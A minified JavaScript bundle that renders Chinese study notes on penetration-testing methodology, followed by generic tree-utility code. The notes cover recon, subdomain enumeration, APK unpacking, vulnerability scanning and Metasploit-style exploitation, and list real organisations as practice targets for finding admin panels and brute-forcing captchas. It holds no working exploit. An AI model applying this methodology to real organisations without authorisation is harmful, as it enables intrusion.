8888\uFF09"),u.a.createElement("li",null,"wmap"),u.a.createElement("li",null,"lnmap"))),u.a.createElement("li",null,"\u3010\u4E00\u4F53\u5316\u3011\u642D\u5EFA \u4E0E \u5E38\u89C4\u642D\u5EFA \u7684\u533A\u522B",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4E2D\u95F4\u4EF6\u7684\u7ED3\u679C",u.a.createElement("ol",null,u.a.createElement("li",null,"http\u8BF7\u6C42\u8FD4\u56DE"),u.a.createElement("li",null,"Header\u7684 Server\u5B57\u6BB5"),u.a.createElement("li",null,"phpStudy \u2014\u2014 Apche/ OpenSSL/ PHP/"),u.a.createElement("li",null,"\u5B9D\u5854 \u2014\u2014 Apache/ OpenSSL mod_fcgid/"))),u.a.createElement("li",null,"(\u663E\u793A)\u5F88\u5168\u7684\uFF0C\u4E00\u822C\u5C31\u662F \u642D\u5EFA\u8F6F\u4EF6")))))}]},b.WAF\u9632\u62A4\u5206\u6790]},{name:"APP \u53CA \u5176\u4ED6\u8D44\u4EA7\uFF0C\u7B49",desc:u.a.createElement(u.a.Fragment,null,"\u601D\u8DEF\uFF0C\u6309\u7167\u4E4B\u524D\u7684\u3010\u603B\u4F53\u601D\u8DEF\u3011",u.a.createElement("br",null),u.a.createElement("br",null),"(\u5C55\u793A\u7684\u8FC7\u7A0B\u4E2D\uFF0C\u6CA1\u6709\u6BCF\u4E2AIP\u53BB\u626B)",u.a.createElement("br",null),"\u771F\u5B9E\u8FC7\u7A0B\u4E2D\uFF0C\u4E3A\u4E86\u53D1\u73B0\u673A\u4F1A\uFF0C\u6BCF\u4E2AIP\u90FD\u5E94\u8BE5\u53BB\u626B\u4E00\u904D\u7684",u.a.createElement("br",null)),steps:[{name:"ApkAnalyzer\uFF0C\u89E3\u5305",content:u.a.createElement(u.a.Fragment,null,"\u83B7\u53D6 \u611F\u5174\u8DA3\u7684url",u.a.createElement("ol",null,u.a.createElement("li",null)),"\u4F7F\u7528",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.ApkAnalyzer_\u89E3\u5305_\u9006\u5411\u5DE5\u5177)))},{name:"BurpSuite\u6293\u5305  \u83B7\u53D6url",content:u.a.createElement(u.a.Fragment,null,"\u83B7\u53D6url",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6293\u5305\u5230 \u5404\u4E2A\u7F51\u7AD9\u57DF\u540D"),u.a.createElement("li",null,"\u518D \u6309\u7167 \u300AWeb\u300B \u7684\u601D\u8DEF"),c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.BurpSuite_\u6293\u5305\u5DE5\u5177)))},{name:"\u5BF9 url \u8FDB\u884C\u5206\u6790",steps:[{name:"\u601D\u8DEF",steps:[{name:"\u7AEF\u53E3\u4E00\u987F\u4E71\u626B",content:u.a.createElement(u.a.Fragment,null,"\u53EF\u89C1 \u300A\u6F0F\u6D1E\u53D1\u73B0\u300B")},{name:"\u63A5\u53E3\u4E00\u987F\u4E71\u626B",content:u.a.createElement(u.a.Fragment,null,"\u5177\u4F53\u662F\u6307\uFF1F\uFF1F\uFF1F\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026 SqlMap\u5417\uFF1F")},{name:"\u90E8\u5206\u63A5\u53E3\u8FDB\u884C\u6D4B\u8BD5",content:u.a.createElement(u.a.Fragment,null,"\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")}]},o.\u57FA\u672C,c.nmap_\u7EFC\u5408\u5DE5\u5177.\u57FA\u672C]},{name:"\u67E5\u5907\u6848",desc:u.a.createElement(u.a.Fragment,null,"\u67E5\u53E6\u5916\u7684\u7AD9"),content:u.a.createElement(u.a.Fragment,null,"\u5728\u522B\u7684\u5730\u65B9\u63D0\u5230\u4E86",u.a.createElement("ol",null,u.a.createElement("li",null)),"\u76F8\u5173\u5DE5\u5177\uFF1A",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.\u7EC4.\u57DF\u540D["\u3010\u7EC4\u3011\u67E5\u5907\u6848\u5DE5\u5177_whois_\u7B49\u7B49"])))},{name:"\u5B50\u57DF\u540D",desc:c.\u7EC4["\u3010\u7EC4\u3011\u5B50\u57DF\u540D\u5DE5\u5177"].desc,content:u.a.createElement(u.a.Fragment,null,"\u76F8\u5173\u5DE5\u5177\uFF1A",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.\u7EC4["\u3010\u7EC4\u3011\u5B50\u57DF\u540D\u5DE5\u5177"])))},{name:"\u65C1\u6CE8_\u53CD\u67E5IP",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.\u7EC4["\u3010\u7EC4\u3011\u65C1\u6CE8_\u53CD\u67E5IP_\u5DE5\u5177"])))},{name:"\u76F8\u5173\u5173\u952E\u8BCD",desc:u.a.createElement(u.a.Fragment,null,"\u5982\uFF1A\u67E5\u51EF\u513F\u5F97\u4E50 \u4F20\u9500\u7F51\u7AD9\uFF0C\u4E00\u822C\u4F1A\u7ECF\u5E38\u66F4\u6362\u5730\u65B9"),content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026")}]},{name:"\u8D44\u4EA7\u76D1\u63A7  \u62D3\u5C55",steps:[y.Github\u76D1\u63A7,D.\u4E2D\u95F4\u4EF6_\u5E38\u7528\u6F0F\u6D1E,{name:"\u9ED1\u6697\u5F15\u64CE\uFF0C\u5B9E\u73B0  \u57DF\u540D\u7AEF\u53E3  \u6536\u96C6",steps:[o.\u57DF\u540D_\u6536\u96C6,o.\u7AEF\u53E3_\u6536\u96C6]},{name:"\u5168\u81EA\u52A8\u57DF\u540D  \u6536\u96C6\u3001\u679A\u4E3E",steps:[c.teemo_\u5168\u81EA\u52A8\u57DF\u540D_\u5B50\u57DF\u540D_\u6536\u96C6\u5DE5\u5177,c.Layer_\u5B50\u57DF\u540D_\u6316\u6398\u673A_\u5DE5\u5177,c.\u706F\u5854ARL_\u5168\u81EA\u52A8_\u6240\u6709\u8D44\u4EA7\u6536\u96C6_\u5DE5\u5177]},{name:"\u5168\u81EA\u52A8\uFF0C\u901A\u7528\u8D44\u4EA7\u6536\u96C6",steps:[c.\u706F\u5854ARL_\u5168\u81EA\u52A8_\u6240\u6709\u8D44\u4EA7\u6536\u96C6_\u5DE5\u5177]},{name:"\u3010SRC\u76EE\u6807 / \u5382\u5546\u76EE\u6807\u3011\u4E2D\u7684\uFF0C\u4FE1\u606F\u6536\u96C6\u5168\u8986\u76D6",steps:[{name:"\u6D4B\u8BD5\u4F8B\u5B50",content:u.a.createElement(u.a.Fragment,null,"\u8865\u5929",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6D59\u6C5F\u65C5\u6E38\u5B66\u9662"),u.a.createElement("li",null,"(\u6362\u4E00\u4E2A\u96BE\u5EA6\u9AD8\u4E00\u70B9\u7684) \u4E0A\u6D77\u76F4\u5CA9",u.a.createElement("ol",null,u.a.createElement("li",null,"\u627E\u51FA\u540E\u53F0"),u.a.createElement("li",null,"\u627E\u51FA\u3010\u65E0\u9A8C\u8BC1\u7801\u3011"),u.a.createElement("li",null,"\u627E\u51FA\u3010\u9A8C\u8BC1\u7801\u7206\u7834\u3011"),u.a.createElement("li",null,"\u627E\u51FA\u3010Jenkins\u3011")))))},d.\u8303\u56F4\u9605\u8BFB_\u5B50\u57DF\u540D\u76F8\u5173]},{name:"\u5229\u7528\u7B2C\u4E09\u65B9\u63A5\u53E3",desc:u.a.createElement(u.a.Fragment,null,"\u7B2C\u4E09\u65B9\u63A5\u53E3_\u5176\u5B9E\u66F4\u65B0\u7684\u633A\u5FEB_\u8FD9\u91CC\u90FD\u662F\u4E0D\u5168\u7684"),content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.\u7EC4["\u3010\u7EC4\u3011\u7B2C\u4E09\u65B9\u63A5\u53E3"])))},A.\u57FA\u672C\u4ECB\u7ECD]}]},P={name:"\u6F0F\u6D1E\u53D1\u73B0",desc:"\u6F0F\u6D1E\u53D1\u73B0",steps:[{name:"\u64CD\u4F5C\u7CFB\u7EDF",desc:u.a.createElement(u.a.Fragment,null,"\uFF08\u8865\u5145\uFF09\u8981\u601D\u8003\u6E05\u695A\u7684\u95EE\u9898",u.a.createElement("ol",null,u.a.createElement("li",null,"1. \u7CFB\u7EDF\u6F0F\u6D1E \u53D1\u73B0\u610F\u4E49 \uFF1F"),u.a.createElement("li",null,"2. \u6F0F\u6D1E\u7C7B\u578B \u5371\u5BB3\u60C5\u51B5 \uFF1F"),u.a.createElement("li",null,"3. \u5982\u4F55\u505A\u597D \u672A\u535C\u5148\u77E5 \uFF1F"))),steps:[c.\u7EC4["\u3010\u7EC4\u3011\u64CD\u4F5C\u7CFB\u7EDF_\u3010\u6F0F\u6D1E\u3011_\u63A2\u9488\u5DE5\u5177"],{name:"\u3010\u6F0F\u6D1E\u3011 \u7C7B\u578B",content:u.a.createElement(u.a.Fragment,null,"\u603B\u4F53\u800C\u8A00",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6743\u9650\u63D0\u5347\u3001\u8FDC\u7A0B\u6267\u884C\u3001\u84DD\u5C4F\u3001\u5D29\u6E83\uFF0C\u7B49")),"\u5206\u7C7B",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDC\u7A0B\u6267\u884C"),u.a.createElement("li",null,"\u6743\u9650\u63D0\u5347"),u.a.createElement("li",null,"\u7F13\u51B2\u533A\u6EA2\u51FA")))},{name:"\u3010\u6F0F\u6D1E\u3011 \u5229\u7528",steps:[{name:"\u5DE5\u5177\u6846\u67B6",steps:[c.MetaSploit_\u6F0F\u6D1E_\u5DE5\u5177\u6846\u67B6,c.SearchSploit_\u6F0F\u6D1E_\u5DE5\u5177\u6846\u67B6]},E.\u96C6\u4E2D_\u67E5\u8BE2\u7F51\u7AD9_\u53CA\u6F0F\u6D1E\u5E93,E.\u96F6\u6563_\u590D\u73B0\u6587\u7AE0]},{name:"\u3010\u6F0F\u6D1E\u3011 \u4FEE\u590D",content:u.a.createElement(u.a.Fragment,null,"\u65B9\u5F0F",u.a.createElement("ol",null,u.a.createElement("li",null,v.\u4FEE\u590D.\u6253\u597D\u8865\u4E01),u.a.createElement("li",null,v.\u4FEE\u590D.\u5173\u95ED\u5165\u53E3),u.a.createElement("li",null,v.\u4FEE\u590D["\u90E8\u7F72WAF / \u9632\u62A4\u5E94\u7528"])))}]},{name:"WEB\u5E94\u7528",steps:[{name:"\u5DF2\u77E5CMS",desc:u.a.createElement(u.a.Fragment,null,"\u5982",u.a.createElement("ol",null,u.a.createElement("li",null,"dedecms\uFF08\u7EC7\u68A6\uFF09"),u.a.createElement("li",null,"discuz"),u.a.createElement("li",null,"wordpress"))),steps:[{name:"\u6F0F\u6D1E\u5E73\u53F0",steps:[E.\u96C6\u4E2D_\u67E5\u8BE2\u7F51\u7AD9_\u53CA\u6F0F\u6D1E\u5E93]},c.\u7EC4["\u3010\u7EC4\u3011CMS\u63A2\u9488\u5DE5\u5177_\u6846\u67B6"],{name:"\u4EE3\u7801\u5BA1\u8BA1",steps:[C.\u4EE3\u7801\u5BA1\u8BA1_\u5DE5\u5177.\u603B\u548C,{name:"\u51FD\u6570\u70B9 \u6316\u6398",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026")},{name:"\u529F\u80FD\u70B9 \u6316\u6398",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026")},{name:"\u6846\u67B6\u7C7B \u6316\u6398",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026")}]}]},{name:"\u5F00\u53D1\u6846\u67B6",steps:[C.\u8BED\u8A00.\u8BED\u8A00_PHP,C.\u8BED\u8A00.\u8BED\u8A00_Java,C.\u8BED\u8A00.\u8BED\u8A00_Python]},{name:"\u672A\u77E5CMS",steps:[c.\u7EC4["\u3010\u7EC4\u3011WEB\u5E94\u7528_\u3010\u6F0F\u6D1E\u3011_\u63A2\u9488\u5DE5\u5177"],c.\u624B\u52A8\u67E5\u8BE2.\u4EBA\u5DE5\u63A2\u9488_WEB\u5E94\u7528_\u6F0F\u6D1E\u626B\u63CF]},{name:"\u7AEF\u53E3\u3001IP\u3001\u57DF\u540D",desc:u.a.createElement(u.a.Fragment,null,"\u4ECE\u540E\u9762\u7684 \u8865\u5145\u77E5\u8BC6 \u800C\u6765"),steps:[{name:"\u7AEF\u53E3\u4E0D\u540C",content:u.a.createElement(u.a.Fragment,null,"\u4F8B\u5B50",u.a.createElement("ol",null,u.a.createElement("li",null,"xx.com"),u.a.createElement("li",null,"xx.com:8080")))},{name:"IP\u8BBF\u95EE \u548C \u57DF\u540D\u8BBF\u95EE\uFF0C\u7684\u5DEE\u522B",content:u.a.createElement(u.a.Fragment,null,"\u5DEE\u522B",u.a.createElement("ol",null,u.a.createElement("li",null,"\u57DF\u540D\u7F51\u7AD9 \u548C IP\u7F51\u7AD9\uFF0C\u6307\u5411\u7684\u53EF\u80FD\u662F \u4E0D\u540C\u7684\u4E0A\u4E0B\u7EA7\u76EE\u5F55",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6709\u65F6\u5019\uFF0C\u53EF\u4EE5\u62FF zip\u5907\u4EFD\u6587\u4EF6 \uFF0Cweb.zip")))),"\u4F8B\u5B50",u.a.createElement("ol",null,u.a.createElement("li",null,"101.99.50.38")))},{name:"\u57DF\u540D \u67E5\u627E",steps:[{name:"\u6CE8\u518C\u4EBA",desc:u.a.createElement(u.a.Fragment,null,"\u540C\u4E00\u4E2A\u4EBA\u624B\u4E0B\uFF0C\u6709\u54EA\u4E9B\u57DF\u540D"),steps:[c.\u7EC4.\u57DF\u540D["\u3010\u7EC4\u3011\u67E5\u5907\u6848\u5DE5\u5177_whois_\u7B49\u7B49"]]},{name:"\u57DF\u540D\u767B\u8BB0",desc:u.a.createElement(u.a.Fragment,null,"\u54EA\u4E9B\u57DF\u540D\uFF0C\u662F\u5DF2\u7ECF\u5B58\u5728\u7684"),steps:[c.\u7EC4.\u57DF\u540D["\u3010\u7EC4\u3011\u67E5\u5907\u6848\u5DE5\u5177_whois_\u7B49\u7B49"]]},{name:"\u5176\u5B83\u7279\u6709\u4FE1\u606F (\u7F51\u7AD9\u7279\u6709)",desc:u.a.createElement(u.a.Fragment,null,"\u53EF\u80FD \u540C\u4E00\u6279 \u590D\u7528"),steps:[{name:"\u5173\u952E\u5B57",desc:u.a.createElement(u.a.Fragment,null,"\u53EF\u80FD \u540C\u4E00\u6279 \u590D\u7528")},{name:"\u6807\u9898",desc:u.a.createElement(u.a.Fragment,null,"\u53EF\u80FD \u540C\u4E00\u6279 \u590D\u7528")},{name:"\u4E0D\u540C\u540D\u79F0\u7684\u62FC\u97F3",desc:u.a.createElement(u.a.Fragment,null,"\u548C \u300A\u3010\u4E60\u60EF\u3011 \u7C7B\u4F3C\u57DF\u540D\u7AD9\u70B9\u300B\u7BC7 \u6709\u4E00\u5B9A\u8054\u7CFB"),content:u.a.createElement(u.a.Fragment,null,"\u6BD4\u5982",u.a.createElement("ol",null,u.a.createElement("li",null,"\u7231\u5FC3\u5DE5\u7A0B \u2014\u2014> \u62FC\u97F3\u4E3Aaxgc")))}]}]}]},{name:"WSDL\uFF0C\u7F51\u7EDC\u670D\u52A1\u63CF\u8FF0\u8BED\u8A00",content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"\u662F\u4E00\u79CD\u6BD4\u8F83 \u91CD \u548C \u8001 \u7684Web\u63A5\u53E3\u6280\u672F\u3002"),u.a.createElement("li",null,"\u5E38\u89C1\u9879\u76EE",u.a.createElement("ol",null,u.a.createElement("li",null,"\u91D1\u878D\u673A\u6784\u7684\u5386\u53F2\u5E94\u7528"),u.a.createElement("li",null,"\u6BD4\u8F83\u8001\u7684\u5E94\u7528")))),"\u6F0F\u6D1E\u5173\u952E\u5B57",u.a.createElement("ol",null,u.a.createElement("li",null,"inurl:xxxx?wsdl")),"\u6D4B\u8BD5\u5DE5\u5177\uFF1A",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.Soap_UI_PRO_\u4E0D\u77E5\u9053\u662F\u5565\u7684\u6D4B\u8BD5\u5DE5\u5177),c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.awvs_WEB\u5E94\u7528_\u6F0F\u6D1E\u626B\u63CF)))}]},{name:"APP\u5E94\u7528",desc:u.a.createElement(u.a.Fragment,null,"\u601D\u8DEF\u8BF4\u660E",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4E00\u3001 \u53CD\u7F16\u8BD1\u63D0\u53D6URL \u6216 \u6293\u5305\u83B7\u53D6URL\uFF0C\u8FDB\u884CWEB\u5E94\u7528\u6D4B\u8BD5\uFF0C"),u.a.createElement("li",null,u.a.createElement("br",null)),u.a.createElement("li",null,"\u4E8C\u3001 \u5982\u4E0D\u5B58\u5728 \u6216 \u8D70\u5176\u4ED6\u534F\u8BAE\u7684\u60C5\u51B5\u4E0B\uFF0C\u9700\u91C7\u7528\u7F51\u7EDC\u63A5\u53E3\u6293\u5305 \u8FDB\u884C\u6570\u636E\u83B7\u53D6"),u.a.createElement("li",null,u.a.createElement("br",null)),u.a.createElement("li",null,"\u4E09\u3001 \u8F6C\u81F3 \u5176\u4ED6\u534F\u8BAE \u5B89\u5168\u6D4B\u8BD5"))),steps:[c.\u7EC4["\u3010\u7EC4\u3011\u624B\u673A\u6A21\u62DF\u5668"],c.\u7EC4["\u3010\u7EC4\u3011\u603B\u548C_\u6293\u5305\u5DE5\u5177"],{name:"\u534F\u8BAE",steps:[{name:"WEB \u534F\u8BAE\u7C7B",desc:u.a.createElement(u.a.Fragment,null,"\u6309 \u4E0A\u8FF0\u3010\u6F0F\u6D1E\u53D1\u73B0 \u2014\u2014 WEB\u5E94\u7528\u3011 \u7684\u601D\u8DEF\u3002")},{name:"\u5176\u4ED6 \u534F\u8BAE\u7C7B",desc:u.a.createElement(u.a.Fragment,null,"\u6309 \u4E0B\u8FF0 \u601D\u8DEF",u.a.createElement("ol",null,u.a.createElement("li",null,"\u3010\u4FE1\u606F\u6536\u96C6 \u2014\u2014 APP \u53CA \u5176\u4ED6\u8D44\u4EA7\uFF0C\u7B49\u3011"),u.a.createElement("li",null,"\u3010\u6F0F\u6D1E\u53D1\u73B0 \u2014\u2014 API\u63A5\u53E3\u670D\u52A1\u3011")))}]},{name:"\u9006\u5411",steps:[{name:"\u4E00\u952E\u63D0\u53D6APK  \u6D89\u53CAURL",content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.ApkAnalyzer_\u89E3\u5305_\u9006\u5411\u5DE5\u5177)))},{name:"\u53CD\u7F16\u8BD1  \u91CD\u5199\u4EE3\u7801\u6BB5  \u7F16\u8BD1\u6D4B\u8BD5",desc:u.a.createElement(u.a.Fragment,null,"\u8C03\u7528\u65B9\u6CD5\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026",u.a.createElement("br",null),"\u5C0F\u8FEA\u53EA\u8BB2\u4E86\u601D\u8DEF\uFF0C\u6CA1\u8BB2\u65B9\u6CD5"),content:u.a.createElement(u.a.Fragment,null,"\u53E6\u5916\u7684\u5DE5\u5177",u.a.createElement("ol",null,u.a.createElement("li",null,"\u2026\u2026\u2026\u2026")))}]}]},{name:"\u670D\u52A1\u3001\u534F\u8BAE / \u7B2C\u4E09\u65B9\u670D\u52A1\u3001\u7B2C\u4E09\u65B9API\u63A5\u53E3",steps:[{name:"\u7B2C\u4E09\u65B9\u670D\u52A1",desc:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6839\u636E\u524D\u671F\u4FE1\u606F\u6536\u96C6 \u9488\u5BF9 \u3010\u76EE\u6807\u7AEF\u53E3\u670D\u52A1\u7C7B\u63A2\u9488\u3011 \u540E\u8FDB\u884C\u7684\u5B89\u5168\u6D4B\u8BD5"),u.a.createElement("li",null,"\u5C5E\u4E8E \u7AEF\u53E3\u670D\u52A1/\u7B2C\u4E09\u65B9\u670D\u52A1\u7C7B \u5B89\u5168\u6D4B\u8BD5\u9762"),u.a.createElement("li",null,"\u4E00\u822C\u5728 \u5DF2\u77E5\u5E94\u7528\u65E0\u601D\u8DEF \u7684\u60C5\u51B5\u4E0B\uFF0C\u9009\u7528\uFF0C \u7684\u5B89\u5168\u6D4B\u8BD5\u65B9\u6848")),"\u6D89\u53CA\u7684 \u653B\u51FB\u65B9\u6CD5",u.a.createElement("ol",null,u.a.createElement("li",null,"\u53E3\u4EE4\u5B89\u5168 \uFF0C \u5982\u5F31\u53E3\u4EE4\u76F4\u63A5\u767B\u5F55"),u.a.createElement("li",null,"WEB\u7C7B\u6F0F\u6D1E \uFF0C \uFF1F"),u.a.createElement("li",null,"\u7248\u672C\u6F0F\u6D1E \uFF0C \u67D0\u4E9B\u8001\u7248\u672C\uFF0C\u76F4\u63A5\u62A5\u6F0F\u6D1E"))),steps:[D.\u7AEF\u53E3\u670D\u52A1_\u5E38\u7528\u6F0F\u6D1E,c.\u7EC4["\u3010\u7EC4\u3011\u5F31\u53E3\u4EE4\u68C0\u67E5_\u7206\u7834\u5DE5\u5177"],c.\u7EC4["\u3010\u7EC4\u3011\u7AEF\u53E3_\u3010\u6F0F\u6D1E\u3011_\u63A2\u9488\u5DE5\u5177"],{name:"\u5229\u7528\u6D4B\u8BD5",steps:[{name:"\u5355\u4E2AEXP",tags:[F.\u9700\u8981\u91CD\u65B0\u4ECE\u89C6\u9891\u8865\u5145],content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F")},{name:"\u5355\u4E2A\u811A\u672C\u6216\u5DE5\u5177",tags:[F.\u9700\u8981\u91CD\u65B0\u4ECE\u89C6\u9891\u8865\u5145],content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F")}]},{name:"\u5B89\u5168 \u4FEE\u590D",content:u.a.createElement(u.a.Fragment,null,"\u65B9\u5F0F",u.a.createElement("ol",null,u.a.createElement("li",null,v.\u4FEE\u590D.\u6253\u597D\u8865\u4E01),u.a.createElement("li",null,v.\u4FEE\u590D.\u7248\u672C\u5347\u7EA7),u.a.createElement("li",null,v.\u4FEE\u590D["\u90E8\u7F72WAF / \u9632\u62A4\u5E94\u7528"])))}]},{name:"\u7B2C\u4E09\u65B9 API\u63A5\u53E3",desc:u.a.createElement(u.a.Fragment,null,"\u57FA\u672C\u4ECB\u7ECD\uFF1A"),steps:[e.\u5E94\u7528\u9762.\u603B\u548C,{name:"\u63A2\u9488\u9762",steps:[{name:"\u722C\u866B\u53C2\u6570",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},{name:"\u5E94\u7528\u731C\u6D4B",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},{name:"\u5F15\u64CE\u67E5\u627E",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")}]},{name:"\u5B89\u5168\u9762",steps:[{name:"\u903B\u8F91\u8D8A\u6743",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},{name:"\u8F93\u5165\u63A7\u5236",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},{name:"\u63A5\u53E3\u5B89\u5168",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},{name:"\u4FE1\u606F\u6CC4\u9732",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")}]},{name:"\u5229\u7528\u9762",steps:[c.Soap_UI_PRO_\u4E0D\u77E5\u9053\u662F\u5565\u7684\u6D4B\u8BD5\u5DE5\u5177,{name:"WS-Attacker",tags:[F.\u653E\u5230\u6700\u540E\u8003\u8651],content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},c.BurpSuite_\u6293\u5305\u5DE5\u5177,c.awvs_WEB\u5E94\u7528_\u6F0F\u6D1E\u626B\u63CF]},{name:"\u4FEE\u590D\u9762",content:u.a.createElement(u.a.Fragment,null,"\u65B9\u5F0F",u.a.createElement("ol",null,u.a.createElement("li",null,v.\u4FEE\u590D.\u6253\u597D\u8865\u4E01),u.a.createElement("li",null,v.\u4FEE\u590D.\u7248\u672C\u5347\u7EA7),u.a.createElement("li",null,v.\u4FEE\u590D["\u90E8\u7F72WAF / \u9632\u62A4\u5E94\u7528"])))}]}]}]},p={name:"\u5C0F\u8FEA\uFF0C\u4FE1\u606F\u6536\u96C6\uFF0C\u4E3B\u8981\u662F\u4FE1\u606F\u6536\u96C6",steps:[r,_,P]}},"6UJt":function(nu,U,f){"use strict";var R=f("EFp3"),h=f.n(R),l=f("v56E"),j=f.n(l),n=f("R9oj"),u=f("OaEy")},"815F":function(nu,U,f){"use strict";f.d(U,"f",function(){return F}),f.d(U,"d",function(){return k}),f.d(U,"c",function(){return c}),f.d(U,"e",function(){return b}),f.d(U,"a",function(){return v}),f.d(U,"g",function(){return D}),f.d(U,"b",function(){return d});var R=f("U8pU"),h=f("KQm4"),l=f("VTBJ"),j=f("Ff2n"),n=f("bT9E"),u=f("Zm9Q"),t=f("Kwbf"),s=f("OZM5"),m=["children"];function F(A,E){return A!=null?A:E}function k(A){var E=A||{},C=E.title,y=E._title,_=E.key,O=E.children,B=C||"title";return{title:B,_title:y||[B],key:_||"key",children:O||"children"}}function o(A,E){var C=new Map;function y(_){var O=arguments.length>1&&arguments[1]!==void 0?arguments[1]:"";(_||[]).forEach(function(B){var r=B[E.key],P=B[E.children];Object(t.a)(r!=null,"Tree node must have a certain key: [".concat(O).concat(r,"]"));var p=String(r);Object(t.a)(!C.has(p)||r===null||r===void 0,"Same 'key' exist in the Tree: ".concat(p)),C.set(p,!0),y(P,"".concat(O).concat(p," > "))})}y(A)}function c(A){function E(C){var y=Object(u.a)(C);return y.map(function(_){if(!Object(s.h)(_))return Object(t.a)(!_,"Tree/TreeNode can only accept TreeNode as children."),null;var O=_.key,B=_.props,r=B.children,P=Object(j.a)(B,m),p=Object(l.a)({key:O},P),z=E(r);return z.length&&(p.children=z),p}).filter(function(_){return _})}return E(A)}function b(A,E,C){var y=k(C),_=y._title,O=y.key,B=y.children,r=new Set(E===!0?[]:E),P=[];function p(z){var N=arguments.length>1&&arguments[1]!==void 0?arguments[1]:null;return z.map(function(K,S){for(var T=Object(s.g)(N?N.pos:"0",S),H=F(K[O],T),q,G=0;G<_.length;G+=1){var ju=_[G];if(K[ju]!==void 0){q=K[ju];break}}var $=Object(l.a)(Object(l.a)({},Object(n.a)(K,[].concat(Object(h.a)(_),[O,B]))),{},{title:q,key:H,parent:N,pos:T,children:null,data:K,isStart:[].concat(Object(h.a)(N?N.isStart:[]),[S===0]),isEnd:[].concat(Object(h.a)(N?N.isEnd:[]),[S===z.length-1])});return P.push($),E===!0||r.has(H)?$.children=p(K[B]||[],$):$.children=[],$})}return p(A),P}function e(A,E,C){var y={};Object(R.a)(C)==="object"?y=C:y={externalGetKey:C},y=y||{};var _=y,O=_.childrenPropName,B=_.externalGetKey,r=_.fieldNames,P=k(r),p=P.key,z=P.children,N=O||z,K;B?typeof B=="string"?K=function(H){return H[B]}:typeof B=="function"&&(K=function(H){return B(H)}):K=function(H,q){return F(H[p],q)};function S(T,H,q,G){var ju=T?T[N]:A,$=T?Object(s.g)(q.pos,H):"0",au=T?[].concat(Object(h.a)(G),[T]):[];if(T){var uu=K(T,$),eu={node:T,index:H,pos:$,key:uu,parentPos:q.node?q.pos:null,level:q.level+1,nodes:au};E(eu)}ju&&ju.forEach(function(iu,hu){S(iu,hu,{node:T,pos:$,level:q?q.level+1:-1},au)})}S(null)}function v(A){var E=arguments.length>1&&arguments[1]!==void 0?arguments[1]:{},C=E.initWrapper,y=E.processEntity,_=E.onProcessFinished,O=E.externalGetKey,B=E.childrenPropName,r=E.fieldNames,P=arguments.length>2?arguments[2]:void 0,p=O||P,z={},N={},K={posEntities:z,keyEntities:N};return 